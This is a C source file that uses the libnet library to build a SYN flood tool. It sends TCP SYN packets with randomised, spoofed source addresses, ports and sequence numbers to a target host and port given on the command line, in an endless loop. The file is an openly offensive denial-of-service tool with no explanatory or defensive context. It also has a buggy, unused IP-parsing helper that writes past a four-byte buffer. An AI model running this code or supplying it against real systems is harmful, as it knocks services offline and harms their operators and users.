#include <stdlib.h>
#include <stdio.h>
#include <libnet.h>

#define FLOOD_DELAY 500

uint32_t parse_ipv4(char *ip) {
    char ipbytes[4];
    sscanf(ip, "%u.%u.%u.%u", (unsigned int *)&ipbytes[3], (unsigned int *)&ipbytes[2], (unsigned int *)&ipbytes[1], (unsigned int *)&ipbytes[0]);
    return ipbytes[0] | ipbytes[1] << 8 | ipbytes[2] << 16 | ipbytes[3] << 24;
}

int main(int argc, char **argv)
{
    /* Check command line params */
    if (argc < 3) {
        printf("Usage: ./%s <target host> <target port>\n", argv[0]);
        exit(0);
    }
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *ctx;

    /* Open network interface */
    ctx = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (!ctx) {
        fprintf(stderr, "Error init libnet interface %s\n", errbuf);
        exit(-1);
    }

    uint32_t host = libnet_name2addr4(ctx, argv[1], LIBNET_RESOLVE);
    unsigned short port = (unsigned short)atoi(argv[2]);

    /* Seed the random number generator */
    libnet_seed_prand(ctx);

    libnet_ptag_t ip_tag = 0;
    libnet_ptag_t tcp_tag = 0;
    while (1) {
        /* Build the TCP part for packet */
        tcp_tag = libnet_build_tcp(
                    libnet_get_prand(LIBNET_PR16),      /* source TCP port */
                    port,                               /* destination TCP port */
                    libnet_get_prand(LIBNET_PRu16),     /* sequence number */
                    libnet_get_prand(LIBNET_PRu16),     /* acknoledgement number */
                    TH_SYN,                             /* control flags */
                    1024,                               /* Windows size */
                    0,                                  /* checksum */
                    0,                                  /* urgent pointer */
                    LIBNET_TCP_H,                       /* TCP packet size */
                    NULL,                               /* payload */
                    0,                                  /* payload length */
                    ctx,                                /* libnet context */
                    tcp_tag                             /* ptag */
                );

        /* Build the IP part for packet */
        ip_tag = libnet_build_ipv4(
                    LIBNET_TCP_H + LIBNET_IPV4_H,       /* Total packet len */
                    IPTOS_LOWDELAY,                     /* tos */
                    libnet_get_prand(LIBNET_PR16),      /* IP ID */
                    0,                                  /* IP Frag */
                    64,                                 /* TTL */
                    IPPROTO_TCP,                        /* Upper layer protocol */
                    0,                                  /* Checksum */
                    libnet_get_prand(LIBNET_PRu16),     /* Source ip */
                    host,                               /* Dest ip */
                    NULL,                               /* Payload */
                    0,                                  /* Payload size */
                    ctx,                                /* libnet context */
                    ip_tag                                   /* ptag */
                );

        /* Recalculate checksum */

        /* Inject packet */
        int res = libnet_write(ctx);
        //if (res != -1) printf("Successfully write packet !\n");
        usleep(FLOOD_DELAY);
    }

    /* Free the resources, close the network */
    libnet_destroy(ctx);
    return 0;
}
